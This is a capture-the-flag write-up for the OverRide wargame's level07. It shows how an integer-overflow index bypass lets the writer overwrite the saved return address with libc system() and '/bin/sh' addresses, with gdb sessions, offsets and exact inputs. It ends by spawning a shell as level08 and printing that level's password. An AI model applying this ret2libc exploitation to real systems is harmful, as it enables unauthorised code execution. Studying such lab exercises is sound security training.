# level07

This program clear `argv` and `env` and waits for a command in a loop:

- `store`: store a number at address `$buffer + $index * 4`
- `read`: read a number at `$buffer + $index * 4`
- `quit`: quit the program

We also can't :

- store a number where number >> 24 == 183
- store a number where index % 3 == 0

We try to overvwrite an address of the GOT but address are randomized and it didn't work in real environment:

```bash
level07@OverRide:~$ objdump -R level07 
...
0804a014 R_386_JUMP_SLOT   puts
...
(gdb) r
Input command: store

Breakpoint 1, 0x080488ea in main ()
(gdb) x $esp
0xffffd520:     0xffffd544
(gdb) p/d (0x0804a014 - 0xffffd544) / 4
$2 = 33632948
...
Input command: store
 Number: 42424242
 Index: 33632948
 Completed store command successfully
Input command: store
 Number: 42
 Index: 3

Program received signal SIGSEGV, Segmentation fault.
0x028757b2 in ?? ()
```

We can try to overwrite `eip` even if a canary is present to bypass this. The passed to  `store_number` function begins at `0xffffd544` in `main`, 456 bytes from `eip`:

```gdb
Input command: store

Breakpoint 1, 0x080488ea in main ()
(gdb) x/wx $esp
0xffffd520:     0xffffd544
(gdb) x/wx $ebp+4
0xffffd70c:     0xf7e45513
(gdb) p/d (0xffffd70c - 0xffffd544) / 4
$8 = 114
```

We can see that a number at index 114 can't be stored (144 % 3 = 0).

By passing the max int `2147483647` + 1, we can see that we write at index 0, so we can add 114 to write on index 114:

```gdb
Input command: store     
 Number: 42
 Index: 2147483648
 Completed store command successfully
Input command: read
 Index: 0
 Number at data[0] is 42
 Completed read command successfully
Input command: store
 Number: 42
 Index: 2147483762
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 42
 Completed read command successfully
```

We can see that `execve` function is available in the stack:

```gdb
(gdb)  info functions execve
All functions matching regular expression "execve":

Non-debugging symbols:
0xf7ee45e0  execve
0xf7ee4640  fexecve
```

We can now pass it as number of index 114. As argument, we can also find a `/bin/sh` string in the stack:

```gdb
(gdb) info proc map
process 1864
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
...
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
```

We can now try to overwrite index 114 and 116, as 1st argument is taken from `$ebp + 8` in functions:

```bash
Input command: store
 Number: 4159587808
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 2147483764
 Completed store command successfully
Input command: read
 Index: 116
 Number at data[116] is 4160264172
 Completed read command successfully
Input command: quit    
: 0: Can't open 
```

Try with system:

```bash
Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 2147483764
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cd /home/users/level08
$ cat .pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
